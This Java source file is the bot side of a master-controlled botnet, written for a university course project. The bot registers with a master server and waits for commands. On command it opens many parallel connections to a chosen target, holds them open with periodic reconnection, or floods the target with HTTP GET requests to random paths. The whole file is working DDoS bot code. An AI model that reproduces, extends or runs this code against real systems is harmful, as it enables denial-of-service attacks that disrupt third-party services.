/*
@author Rathna Ramesh 
Submitted for CMPE206 course project under Dr.Juan Gomez at SJSU
This is the slave side code for implementing as specified in project spec sheet
the system can take arguements when calling it in command line or during run
Currently pings the destination server - suseptible to time-outs at the Target servers. Please keep that in mind when testing
*/

import java.net.*;
import java.io.*;
import java.lang.*;
import java.util.*;
import java.text.SimpleDateFormat;

class Connect implements Runnable //Class to connect to Host Multithreaded
{
	public static String disconnect_IP = " ";
        public static String disconnect_Port = "0";
	private Thread t;
	private String threadName;
	public String HostIP;
        public String Feature;
	public Integer HostPort;
        Dictionary dict = new Hashtable();
        int i = 0;
        private final String USER_AGENT = "Mozilla/5.0";
        
        /*public void build_dictionary()
        {
            if (i == 0)
            {
                dict.put(1,"apple");
                dict.put(2, "elephant");
                dict.put(3,"KNN Algorithm");
                dict.put(4, "Markov");
                dict.put(5, "hidden Markov");
                dict.put(6, "classifier");
                dict.put(7,"MLP");
                dict.put(8,"regression");
                dict.put(9,"linearRegression");
                dict.put(10,"logisticreg");
                dict.put(11,"preamble");
                dict.put(12,"Melania");
                dict.put(13,"Immigrants");
                dict.put(14, "Economy");
                dict.put(15, "Arizona");
                dict.put(16,"fate");
                dict.put(17,"classifier");
                dict.put(18,"K-Means");
                dict.put(19,"SVM");
                dict.put(20,"probably");
                dict.put(21,"Rotational");
                dict.put(22,"geophysics");
                dict.put(23,"OCD");
                
            }
            
        }*/
        

		
	Connect()
	{
            threadName = "Thread";
            HostIP ="127.0.0.1";
            HostPort = 6000;
            disconnect_IP = " ";
            disconnect_Port = "0";
            i = 1;
            //this.build_dictionary();
	}
        


	Connect(int n, String IP, String PNo, String feature)
        {
            i =1;
            threadName ="Thread_"+Integer.toString(n);			 
            HostIP = IP;
            HostPort = Integer.parseInt(PNo);
            disconnect_IP = " ";
            disconnect_Port = "0";
            Feature = feature;
            //this.build_dictionary();
	}//end of constructor
		
        public static void stopper(String IP, String Port)
	{
            disconnect_IP = IP;
            disconnect_Port = Port;
            for(int i =0;i<2000;i++); //for synchronisation - essential
	}
        
        private void sendGet(String url) throws Exception {

		URL obj = new URL(url);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();

		// optional default is GET
		con.setRequestMethod("GET");

		//add request header
		con.setRequestProperty("User-Agent", USER_AGENT);

		int responseCode = con.getResponseCode();
		//System.out.println("\nSending 'GET' request to URL : " + url); //Debug
		//System.out.println("Response Code : " + responseCode);//Debug

		BufferedReader in = new BufferedReader(
                                    new InputStreamReader(con.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();

		while ((inputLine = in.readLine()) != null) {
			response.append(inputLine);
		}
		in.close();

		//print result
		//System.out.println(response.toString()); //Debug

	}

        @Override
	public void run()
	{   
            String l_IP = HostIP;
            Integer l_Port = HostPort;
            String thread_name = threadName;
            String feature = Feature;
            try
            {                    
                InetAddress address = null;
                try {
                        address = InetAddress.getByName(l_IP);
                    } catch (UnknownHostException e) {//ignore error 
                        
                    }                    
                Socket sock;
                try
                { sock = new Socket(address,l_Port); }
                catch(IOException ioe)
                {
                  sock = new Socket(l_IP,l_Port); 
                }
                //System.out.println("Connected to "+ l_IP + " at "+ l_Port);//new connection intimation //Debug
                boolean stay = true;
                int l1 = 0, l2 = 0;
                String disconnect_IP1 = disconnect_IP; //avoid class objects in thread - will keep changing, problem!
                String disconnect_Port1 = disconnect_Port;
                while(stay) //keeps the socket open till disconnect != your IP
                {
                    l1++;
                    
                    disconnect_IP1 = disconnect_IP; //avoid class objects in thread - will keep changing, problem!
                    disconnect_Port1 = disconnect_Port;
                    InetAddress dis_add = null;
                    Integer dis_port;
                    try {
                            dis_add = InetAddress.getByName(disconnect_IP1);
                        } catch (UnknownHostException e) {//ignore error
                                                            }
                    if ("all".equals(disconnect_Port1))
                        dis_port = l_Port;
                    else
                        dis_port = Integer.parseInt(disconnect_Port1);
                    stay = !(((address == dis_add)||("all".equals(disconnect_IP1)))&&(dis_port == l_Port));
                    if("yes".equals(feature)) //keepAlive start
                    {
                        try
                        {Thread.sleep(200);}
                        catch(InterruptedException ie)
                        {}
                        if (l1 == 70)
                        {l1 =0;
                        
                        sock.close();
                        Connect connection = new Connect(99,l_IP,Integer.toString(l_Port),feature);
                        connection.start(); //open up a new connection in a new thread
                        Connect.stopper(disconnect_IP1,disconnect_Port1); //set other functionalities back to old state
                        stay = false; //close this thread
                        //System.out.println("reconnected"); //Debug
                        }
                    }// remove the older reconnect sequence
                    
                    else if(!"no".equals(feature))//in case of url, send the url
                    {   
                        try
                        {Thread.sleep(200);}
                        catch(InterruptedException ie)
                        {}
                        
                        Random rand = new Random();
                        int len = rand.nextInt(10)+1;
                        String chh;
                        chh = "";
                        for(int j = 0; j<len; j++)
                        {
                            int ch = rand.nextInt(26)+97;
                            chh += Character.toString((char)(int)ch);
                        }
                        String url = "https://"+l_IP+feature+chh;
                        try
                        {
                            sendGet(url);                        
                        }catch(Exception ie)
                        {}
                       }
                }//if disconnect IP and Port are not the same as current thread's local IP and Port, keep going
                    sock.close();
                    //System.out.println("!! Disconnected from "+ l_IP); //Debug
		}
            catch(IOException ex) 
                { 
                    System.exit(-1);// Do nothing   
                }			
	}//end of run
		
	
	public void start()
	{
            if (t==null)
        	{
                    t = new Thread(this,threadName);
                    t.start();
		}
	}//end of start				
}
//end of Connect class
public class SlaveBot
{ 
    public static int numberOfConnections;
    public static String[] IP = new String[100];
    public static String[] Port = new String[100];
    public static int[] k = new int[100];
    public static Integer index = new Integer(0);
    
    
    
    public static void connectcall(String HostIP, String HostPort, String n, String feature)
    {    	
        Connect.stopper(" ","0");
        int N = Integer.parseInt(n);
        int j = 0;
        for(j =0; j<index+1;j++)
        {
            if (((IP[j]==HostIP)||(IP[j]==null))&&((Port[j] == HostPort)||(HostPort == "all")||(Port[j]==null)))
            {
                break;
            }
        }
        for (int i = 0; i< N; i++)
        {
            numberOfConnections++;
            Connect connection = new Connect(numberOfConnections,HostIP,HostPort,feature);
            connection.start();
            k[j] = k[j]+1;
        }
        if(IP[j]== null)
            index++;
        IP[j] = HostIP;
        Port[j] = HostPort;
    }// connectioncall ends
    
    
    public static void disconnectcall(String TargetIP, String TargetPort)
    {
    Connect.stopper(" ","0");
    Connect.stopper(TargetIP, TargetPort); //set disconnect parameters
    int j =0;
    for(j =0; j<index+1;j++)
        {
            if ((IP[j]==TargetIP)||(IP[j]==null)&&(Port[j] == TargetPort)||(TargetPort == "all")||(Port[j]==null))
            {
                break;
            }
        }
    k[j] = 0;
    //System.out.println("disconnect_call"); 
    }
    public static void register(String[] args, int PortNo)
    {        
        try        //register with master
        {	
            InetAddress address = InetAddress.getLocalHost();
            String hostIP = address.getHostAddress();
            String hostName = address.getHostName();
            Socket master = new Socket(args[1],Integer.parseInt(args[3]));				    
            PrintWriter pout = new PrintWriter(master.getOutputStream(),true);
            String timeStamp = new SimpleDateFormat("yyyyMMdd").format(Calendar.getInstance().getTime());
            pout.println(hostName + " " + hostIP + " " + Integer.toString(PortNo)+" " + timeStamp);
            master.close();
        }
        catch(IOException ioe)
        {System.exit(-1);}               
    }
    
    public static void main(String[] args)
    {   
        if("-h".equals(args[0])) //check if starts with -h|h if not exit at else
    	{     
            if (args.length != 4) //check if -h master IP -p portNo is given
            {
		System.exit(-1);    		
            }    				
            int PortNo;
            Random rand = new Random();//generate a port number for slave first
            PortNo = rand.nextInt((65535 - 49152) + 1) + 49152;
            register(args,PortNo);//register the port number with Master - risky as port might not connect but after try wasn't work
            try( ServerSocket slave = new ServerSocket(PortNo);) 
            {      	
                while(true)
                {
                    //listen for connections from master
                    Socket Master = slave.accept(); //shifting this out made listening possible - reason?
    		    try
                    {
    		    InputStream in = Master.getInputStream();//create an input stream to listen into  // create object to get input through socket
                    BufferedReader bin = new BufferedReader(new InputStreamReader(in)); //keeps storing input until master closes the connection
					 //no PrintWriter since it restricts size
                    String line = bin.readLine();
                    //System.out.println(line); //Debug
                    String[] split = line.split("\\s+");
              	    switch (split[0]) {//decode message passed and call appropriate functions
                        case "-c":
                            connectcall(split[1],split[2],split[3], split[4]);
                            
                            break;
                        case "-d":
                            disconnectcall(split[1],split[2]);
                            break;
                        }
                    }
                    catch(IOException ioe)
                        { System.exit(-1);}
                    Master.close();
                }            
            } 
            catch (IOException ex) 
            {
                System.exit(-1);  
            }   	   
    	}
    	else //if it doesn't start with -h|h, dont bother to listen
    	{
            System.exit(-1);
    	}    	    	
    }
}            